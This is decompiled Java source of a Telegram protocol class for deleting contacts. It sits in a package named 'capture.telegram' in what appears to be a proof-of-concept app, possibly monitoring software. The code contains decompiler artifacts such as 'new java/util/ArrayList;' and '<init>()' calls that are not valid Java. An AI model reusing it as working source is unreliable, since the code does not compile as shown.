package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_contacts_deleteContacts
  extends TLObject
{
  public static int constructor = 1504393374;
  public ArrayList id;
  
  public TLRPC$TL_contacts_deleteContacts()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.id = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.id.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.InputUser localInputUser = null;
    for (int k = 0; k < j; k = i)
    {
      localInputUser = (TLRPC.InputUser)this.id.get(k);
      localInputUser.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_contacts_deleteContacts.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */